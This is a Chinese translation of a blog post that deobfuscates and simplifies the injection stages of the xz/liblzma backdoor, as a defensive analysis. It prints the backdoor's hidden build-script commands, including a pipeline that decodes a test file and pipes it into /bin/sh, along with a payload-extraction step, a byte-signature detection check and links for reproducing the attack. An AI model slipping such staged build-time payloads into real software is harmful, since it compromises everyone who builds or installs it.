<!--yml

category: 未分类

date: 2024-05-27 13:20:16

-->

# 简化xz后门 | 费利佩·康特雷拉斯

> 来源：[https://felipec.wordpress.com/2024/04/18/simplifying-the-xz-backdoor/](https://felipec.wordpress.com/2024/04/18/simplifying-the-xz-backdoor/)

我不是安全专家，但我擅长简化。

在我的职业生涯中，我简化了许多其他人认为不可能的事情，我通过遵循少数人采用的简单策略做到了：**永不放弃**。

我过去的成功给了我信心，让我试图简化xz后门的一个方面：挂钩的安装，但我却毫无准备。简化别人试图不过度复杂化的代码一回事，但简化明显不打算让任何人理解的东西完全是另一回事。

结果表明，即使是这一个事情也过于复杂。然而，我并没有放弃，降低了期望，并成功简化了至少后门的开始部分。

这对像我这样试图找出未来如何防止类似事件发生的人应该是有帮助的。

对于急于等待结果的人，结果是[xz-min](https://github.com/felipec/xz-min)，如果您按照说明操作，应该很容易复现后门。

我们将以*特别谨慎*的方式开始，但如果您相信我，您可以直接检查[初始补丁](https://github.com/felipec/xz-hack-refactor/blob/master/origin/dist.diff)，跳过第一部分。

## 清洁室

如我在[我的上一篇文章](https://felipec.wordpress.com/2024/04/04/xz-backdoor-and-autotools-insanity/)中解释的那样，启用后门的催化剂位于分布式压缩包中，而不在git存储库中。因此，为了找到所有恶意更改，我们需要自己生成一个压缩包，但正如我在文章中所解释的，这会产生大量良性差异。尽管我的Arch Linux系统使用的是与它们相同的autoconf和automake版本，但生成的压缩包中仍然存在大量差异。

首先，为了生成压缩包，我不得不安装po4a、doxygen和ghostscript。现在，您可能认为检查文档没有意义，但xz项目分发PDF文档。恶意行为者是否可以向PDF中添加一些二进制数据块，并在构建过程中提取？我不知道，但我想绝对确定那里没有任何东西。

PDF文档是使用ghostscript 9.55.0和groff 1.22.4生成的，因此我安装了它们。此外，API文档是使用doxygen 1.9.7生成的，因此我也安装了它。通过这种方式，我能够验证文档中没有任何恶意内容。我不得不手动检查了14个分布式的PDF文档，没有额外的二进制数据块。

我必须说一下，为什么一开始要分发PDF文件呢？这些是为手册页生成的，但没有人**会**打开`lzmainfo-letter.pdf`。哦，每个手册页都有**两个**PDF文件，一个是`a4`大小的，另一个是`letter`大小的。当然，`make install`不会安装它们，因为没人关心它们。

更糟糕的是，你根本不需要ghostscript来生成手册页，因为`man`可以自己做到：`man -Tpdf lzmainfo.1 >lzmainfo.pdf`。等等，如果`man`可以做到，为什么xz的开发者要把PDF文件放在他们的tarball里？别问我。但美国信纸怎么办？`MANROFFOPT=-P-pletter man -Tpdf lzmainfo`。

xz开发者似乎真的喜欢把事情弄复杂。

PDF文件搞定后，另一个区别在于`config.guess`和`config.sub`，似乎没什么值得注意的，但还是有。这些文件是由automake生成的，但如果我使用的是同一个版本（1.16.5），为什么它们会不同？嗯，GNU开发者也喜欢把事情复杂化，所以这些文件来自于[config](https://savannah.gnu.org/projects/config)项目，每个发行版对它们的处理方式都不同。Arch Linux只保留automake tarball中的内容，Debian有一个单独的`autotools-dev`包，而Fedora使用`redhat-rpm-config`。

根据以上我们可以猜测，恶意开发者使用了基于RPM的发行版，因为`config.guess=2022-01-09`和`config.sub=2021-12-25`的精确组合与automake 1.16.5发布版或`autotools-dev` 20220109.1没有匹配。我检查了几个Fedora包，似乎没有找到匹配，但在OpenMandriva 5.0中，有一个完全匹配，根据[RPMfind](https://rpmfind.net/linux/rpm2html/search.php?query=automake&system=openmandriva)。

使用这些版本，差异几乎就在那儿，除了某种原因，`Makefile.in`中的`am__DIST_COMMON`缺少一个文件。根据2001年的这个线程，在automake邮件列表中，运行两次`automake`会生成正确的`Makefile.in`。不要试图理解autotools的巫术逻辑。

这为我们提供了最终的[差异](https://github.com/felipec/xz-hack-refactor/blob/master/origin/dist.diff)。

为什么要费这么大劲呢？我是个完美主义者，我不想再做这一步了，现在我百分百确定，tarball `xz-5.6.1.tar.xz` 的SHA-1校验和是`a77dd4689db35cfaa814d1c3a919720bd41f5623`，除了上面的差异外，代码与git中的代码没有任何其他修改。

在线讨论中，我听到的论点是检查tarball很容易，所有的打包者只需安装“autotools”的同一个版本即可。希望读完本节后能清楚地认识到，如果你**真的**试图这么做，这并不容易。

## 把注意力集中在关键点上。

我看到很多分析都集中在 `build-to-host.m4` 上，但该脚本在构建过程中**并未运行**。他们可能专注于这一点，因为差异更容易发现，而且他们不了解 autotools 的工作方式。

实际运行的脚本是 `configure`，我们应该关注这些修改。

例如，这个流行的分析：[xz/liblzma: Bash-stage Obfuscation Explained](https://gynvael.coldwind.pl/?lang=en&id=782) 由 Gynvael Coldwind 解释了许多内容，但没有解释 `gl_am_configmake` 在“stage 0” 中来自哪里。

因为这个黑客技巧非常复杂，很容易忽略细节，但我们不会在这里这样做，因为我们将**专注**于这个东西**实际上做了什么**，这样做的好处是我们知道 autotools 应该如何工作。

如果你看一下被黑客入侵的 `configure` 脚本，你会看到 `gl_am_configmake` 被保存到一个名为 `$CONFIG_STATUS` 的文件中，即 `config.status`。如果我们打开那个文件，我们会看到：

```
gl_am_configmake='./tests/files/bad-3-corrupt_lzma2.xz' 
```

这比原来的复杂程度要少得多：

```
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null` 
```

但只有当你了解 `autoconf` 的工作原理时，才能使用它，而大多数人不了解。实际上并不是这样。

在 autoconf 手册的开头就有，解释了 `configure` 脚本：“一个名为 config.status 的 shell 脚本，运行时会重新创建上述文件”。所以 `configure` 生成 `config.status`，然后运行它，这才是真正修改构建系统的地方。

`grep` 命令可能看起来令人生畏，但它只是在查找包含字符串 `#` 4次，然后5个字母数字字符，然后再4个 `#` 的文件，例如：

```
grep -r "####Hello####"
grep: tests/files/bad-3-corrupt_lzma2.xz: binary file matches 
```

这并不那么难，对吧？

嗯，如果你看的是一个有**25,752行**混淆的 shell 脚本，在一个好天里也不知道它试图做什么，而且没有引用到良性版本，我想这可能会很难。幸运的是我们在这里不会这样做。

这就是真正的步骤 0。

## 步骤 1

根据前面的步骤，你能猜到这个黑客技巧要做什么吗？

你猜对了：它将尝试对 `bad-3-corrupt_lzma2.xz` 做些什么，幸运的是，所有相关内容都在 `config.status` 脚本中紧邻其旁：

```
gl_path_map='tr "\t \-_" " \t_\-"'
gl_localedir_prefix='xz'
gl_am_configmake='./tests/files/bad-3-corrupt_lzma2.xz'
localedir_c_make='\"$(localedir)\"'
gl_localedir_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_localedir_prefix -d 2>/dev/null' 
```

分析起来可能有点棘手……但我们不需要这样做，我们可以直接 `echo` 整个内容：

```
echo "sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_localedir_prefix -d 2>/dev/null"
sed "r\n" ./tests/files/bad-3-corrupt_lzma2.xz | eval tr "\t \-_" " \t_\-" | xz -d 2>/dev/null 
```

但同样，实际上不需要理解它的具体作用，我们只需知道 `xz -d` 解压输入，所以它接收到的是有效的 xz 流，结果是另一个简化的 shell 脚本，实际上做了：

```
xz -dc tests/files/good-large_compressed.lzma | \
stuff | \
xz -F raw --lzma1 -dc | \
/bin/sh 
```

现在这就变得棘手了，因为那个脚本相当复杂。但我们可以直接运行它并查看它的操作，除非它什么也不做，所以我们确实需要偷看一下。

在那段脚本深处有一个有趣的检查：

```
test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64" 
```

这是在测试我们是否在构建deb包还是rpm包，但我们可以通过`export RPM_ARCH=x86_64`简化。我们再试一次，**大成功**！现在修改了两个文件：`libtool`和`src/liblzma/Makefile`。

[这是差异](https://github.com/felipec/xz-hack-refactor/blob/master/origin/build.diff)。第一步已完成。所以现在我们知道`bad-3-corrupt_lzma2.xz`的用途了。

## 第1b步

再次强调，我们不需要理解这些更改的细节，我们只需知道`src/liblzma/Makefile`被修改了。如果我们进入该目录并输入`make`，将生成一个名为`.libs/liblzma.so.5`的文件，这才是真正的目标。

如果我们检查[原始报告](https://openwall.com/lists/oss-security/2024/03/29/4/3)中提供的十六进制转储：

```
hexdump -ve '1/1 "%.2x"' .libs/liblzma.so.5 | \
	grep -q 'f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410'
test $? = 0 && echo hacked 
```

这个库已经受到了攻击。因此，在`Makefile`中确实引入了后门。

如果我们检查`Makefile`中的更改，可以看到这样的内容：

```
am__test = bad-3-corrupt_lzma2.xz 
```

等等，我以为我们已经处理完`bad-3-corrupt_lzma2.xz`了，发生了什么？

如果缩进包含在主脚本内部，那么很容易看到实际上该脚本有**两个**模式，一个是当`config.status`在当前目录时，另一个是当`.libs/liblzma_la-crc64_fast.o`存在时。因此，一个模式是顶层目录的，另一个是我们在`src/liblzma`内部时的。

重复使用`bad-3-corrupt_lzma2.xz`是有道理的，毕竟引入另一个带有黑客攻击的测试文件将会非常棘手。

不幸的是，第二种模式要复杂得多，我们无法简化它。我在第一部分尝试的结果是[decrypt_rc4.sh](https://github.com/felipec/xz-hack-refactor/blob/master/origin/decrypt_rc4.sh)，虽然更可读，但仍然非常复杂。用户X的nugxperience [确认](https://x.com/nugxperience/status/1773906926503591970)这个awk代码实际上是一个[RC4解密器](https://en.wikipedia.org/wiki/RC4)。

如果我们将另一个测试文件`good-large_compressed.lzma`作为输入，输出就是ELF二进制对象的后门，而在构建过程中保存为`src/liblzma/liblzma_la-crc64-fast.o`。

但是二进制文件如何使用？我们几乎到达目标了。

## **第** 1c步

在保存ELF二进制对象之后，同一脚本尝试编译`crc64_fast.c`和`crc32_fast.c`，但通过`sed`进行一些即时修改。此外，将`liblzma_la-crc64-fast.o`添加到`crc64_fast.c`的对象文件中，该文件将同时包含这两个文件。

尽管如此，我们无需处理任何这些，我们只需要结果：[code.diff](https://github.com/felipec/xz-hack-refactor/blob/master/origin/code.diff)。

从代码补丁中我们可以看到，它将`is_arch_extension_supported()`修改为`_is_arch_extension_supported()`，并在此处调用了外部的`_get_cpuid`，而原始版本是调用`__get_cpuid`。后者是[标准的](https://github.com/felipec/xz-hack-refactor/blob/master/origin/code.diff)。

带有后门的 ELF 二进制对象实现了虚假的 `_get_cpuid`，这就是一切开始的地方。

我们终于到达了后门的起点。这就是 [真正的复杂性](https://github.com/binarly-io/binary-risk-intelligence/tree/master/xz-backdoor) 开始的地方。

## 摘要

解混淆之后，注入并不复杂：

1.  从一个测试文件中提取二进制对象。

1.  修改代码，从二进制对象中调用 `_get_cpuid`。

```
decrypt_rc4.sh tests/files/good-large_compressed.lzma > src/liblzma/liblzma_la-crc64-fast.o
patch -p1 < code.diff 
```

就是这样。

在 [xz-min](https://github.com/felipec/xz-min) 中，我进一步简化了后门，因为它只是将 liblzma 作为一个跳板。

在 `crc64_fast.c` 和 `crc32_fast.c` 中，分别定义了一个 [ifunc](https://sourceware.org/glibc/wiki/GNU_IFUNC) 解析器（`crc64_resolve` 和 `crc32_resolve`），并且正是这些解析器通过调用 `_get_cpuid` 来激活后门。

但是任何解析器都可以，整个 liblzma 并不需要。因此，我创建了一个 [模拟 liblzma](https://github.com/felipec/xz-min/blob/master/liblzma.c)，后门仍然成功触发。

当然，有趣的不仅仅是构建带有后门的 liblzma，而是实际上如何使用它。你可以通过 xz-min 和 [xzbot](https://github.com/amlweems/xzbot) 进行简单的操作，这里不涉及本文的相关技巧。

尝试简化 `_get_cpuid` 将是第二步。

## 参考文献
